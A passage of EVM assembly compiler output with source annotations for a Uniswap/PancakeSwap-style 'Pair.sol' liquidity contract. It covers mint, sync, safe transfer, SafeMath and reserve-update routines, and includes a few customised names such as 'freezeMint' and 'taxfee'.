\"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_294\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_294:\n      pop\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"Pair.sol\":6925:6937  uint amount0 */\n      0x00\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      tag_295\n        /* \"Pair.sol\":6940:6948  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":6940:6952  balance0.sub */\n      tag_177\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_295:\n        /* \"Pair.sol\":6925:6963  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"Pair.sol\":6973:6985  uint amount1 */\n      0x00\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      tag_296\n        /* \"Pair.sol\":6988:6996  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":6988:7000  balance1.sub */\n      tag_177\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_296:\n        /* \"Pair.sol\":6973:7011  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"Pair.sol\":7022:7032  bool feeOn */\n      0x00\n        /* \"Pair.sol\":7035:7065  _mintFee(_reserve0, _reserve1) */\n      tag_297\n        /* \"Pair.sol\":7044:7053  _reserve0 */\n      dup8\n        /* \"Pair.sol\":7055:7064  _reserve1 */\n      dup8\n        /* \"Pair.sol\":7035:7043  _mintFee */\n      tag_214\n        /* \"Pair.sol\":7035:7065  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_297:\n        /* \"Pair.sol\":7075:7092  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":7095:7106  totalSupply */\n      sload\n        /* \"Pair.sol\":7022:7065  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":7198:7215  _totalSupply == 0 */\n      dup1\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n      tag_298\n      jumpi\n        /* \"Pair.sol\":7243:7297  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_299\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":7243:7274  Math.sqrt(amount0.mul(amount1)) */\n      tag_176\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      tag_218\n        /* \"Pair.sol\":7253:7260  amount0 */\n      dup8\n        /* \"Pair.sol\":7265:7272  amount1 */\n      dup8\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      0xffffffff\n        /* \"Pair.sol\":7253:7264  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":7243:7297  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_299:\n        /* \"Pair.sol\":7231:7297  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"Pair.sol\":7311:7352  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_302\n        /* \"Pair.sol\":7330:7331  0 */\n      0x00\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":7311:7321  freezeMint */\n      tag_303\n        /* \"Pair.sol\":7311:7352  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_302:\n      pop\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n      jump(tag_304)\n    tag_298:\n        /* \"Pair.sol\":7450:7582  Math.min(... */\n      tag_305\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":7476:7513  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      tag_224\n        /* \"Pair.sol\":7476:7483  amount0 */\n      dup7\n        /* \"Pair.sol\":7488:7500  _totalSupply */\n      dup5\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":7476:7487  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":7450:7582  Math.min(... */\n    tag_305:\n        /* \"Pair.sol\":7438:7582  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n    tag_304:\n        /* \"Pair.sol\":7622:7623  0 */\n      0x00\n        /* \"Pair.sol\":7610:7619  liquidity */\n      dup10\n        /* \"Pair.sol\":7610:7623  liquidity > 0 */\n      gt\n        /* \"Pair.sol\":7602:7668  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_310\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_310:\n        /* \"Pair.sol\":7678:7703  freezeMint(to, liquidity) */\n      tag_311\n        /* \"Pair.sol\":7689:7691  to */\n      dup11\n        /* \"Pair.sol\":7693:7702  liquidity */\n      dup11\n        /* \"Pair.sol\":7678:7688  freezeMint */\n      tag_303\n        /* \"Pair.sol\":7678:7703  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_311:\n      pop\n        /* \"Pair.sol\":7714:7763  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_231\n        /* \"Pair.sol\":7722:7730  balance0 */\n      dup7\n        /* \"Pair.sol\":7732:7740  balance1 */\n      dup7\n        /* \"Pair.sol\":7742:7751  _reserve0 */\n      dup11\n        /* \"Pair.sol\":7753:7762  _reserve1 */\n      dup11\n        /* \"Pair.sol\":7714:7721  _update */\n      tag_186\n        /* \"Pair.sol\":7714:7763  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_130:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":641:659  uint public taxfee */\n    tag_132:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n    tag_134:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_316\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_316:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":18612:18618  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18638:18642  this */\n      address\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":18584:18751  _update(... */\n      tag_318\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18612:18618  token0 */\n      and\n      swap2\n        /* \"Pair.sol\":18605:18629  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18612:18618  token0 */\n      dup7\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_319\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_319:\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_320:\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_321\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_321:\n      pop\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":18665:18671  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18691:18695  this */\n      address\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18665:18671  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":18658:18682  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18665:18671  token1 */\n      dup7\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_322\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_322:\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_323:\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_324\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_324:\n      pop\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":18711:18719  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":18733:18741  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":18584:18591  _update */\n      tag_186\n        /* \"Pair.sol\":18584:18751  _update(... */\n      jump\t// in\n    tag_318:\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n      jump\t// out\n        /* \"Pair.sol\":1914:2252  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_149:\n        /* \"Pair.sol\":516:550  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"Pair.sol\":1995:2007  bool success */\n      0x00\n      swap5\n        /* \"Pair.sol\":2009:2026  bytes memory data */\n      0x60\n      swap5\n        /* \"Pair.sol\":2030:2040  token.call */\n      dup10\n      and\n      swap4\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      swap3\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_326:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_328\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_326)\n    tag_328:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_330\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_329)\n        /* \"--CODEGEN--\":16:47   */\n    tag_330:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_329:\n      pop\n        /* \"Pair.sol\":1994:2107  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"Pair.sol\":2138:2145  success */\n      dup2\n        /* \"Pair.sol\":2138:2195  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_332\n      jumpi\n      pop\n        /* \"Pair.sol\":2150:2161  data.length */\n      dup1\n      mload\n        /* \"Pair.sol\":2150:2166  data.length == 0 */\n      iszero\n      dup1\n        /* \"Pair.sol\":2150:2194  data.length == 0 || abi.decode(data, (bool)) */\n      tag_332\n      jumpi\n      pop\n        /* \"Pair.sol\":2181:2185  data */\n      dup1\n        /* \"Pair.sol\":2170:2194  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_333\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_333:\n      pop\n        /* \"Pair.sol\":2170:2194  abi.decode(data, (bool)) */\n      mload\n        /* \"Pair.sol\":2150:2194  data.length == 0 || abi.decode(data, (bool)) */\n    tag_332:\n        /* \"Pair.sol\":2117:2245  require(... */\n      tag_334\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_334:\n        /* \"Pair.sol\":1914:2252  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_175:\n        /* \"SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_336\n      jumpi\n      pop\n      pop\n        /* \"SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"SafeMath.sol\":597:598  x */\n      dup3\n        /* \"SafeMath.sol\":592:593  y */\n      dup3\n        /* \"SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"SafeMath.sol\":592:593  y */\n      dup2\n        /* \"SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_337\n      jumpi\n      invalid\n    tag_337:\n      div\n        /* \"SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_336:\n        /* \"SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_177:\n        /* \"SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"Pair.sol\":3190:4173  function _update(... */\n    tag_186:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3352:3375  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":3352:3402  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_342\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3379:3402  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"Pair.sol\":3352:3402  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_342:\n        /* \"Pair.sol\":3331:3445  require(... */\n      tag_343\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_343:\n        /* \"Pair.sol\":3560:3578  blockTimestampLast */\n      sload(0x0b)\n        /* \"Pair.sol\":3486:3511  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"Pair.sol\":3486:3501  block.timestamp */\n      timestamp\n        /* \"Pair.sol\":3486:3511  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"Pair.sol\":3560:3578  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"Pair.sol\":3543:3578  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"Pair.sol\":3615:3630  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":3615:3648  timeElapsed > 0 && _reserve0 != 0 */\n      tag_345\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3634:3648  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"Pair.sol\":3615:3648  timeElapsed > 0 && _reserve0 != 0 */\n    tag_345:\n        /* \"Pair.sol\":3615:3666  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_346\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3652:3666  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"Pair.sol\":3615:3666  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_346:\n        /* \"Pair.sol\":3611:4007  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_347\n      jumpi\n        /* \"Pair.sol\":3851:3862  timeElapsed */\n      dup1\n        /* \"Pair.sol\":3782:3862  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_348\n        /* \"Pair.sol\":3821:3830  _reserve0 */\n      dup6\n        /* \"Pair.sol\":3787:3814  UQ112x112.encode(_reserve1) */\n      tag_349\n        /* \"Pair.sol\":3804:3813  _reserve1 */\n      dup7\n        /* \"Pair.sol\":3787:3803  UQ112x112.encode */\n      tag_350\n        /* \"Pair.sol\":3787:3814  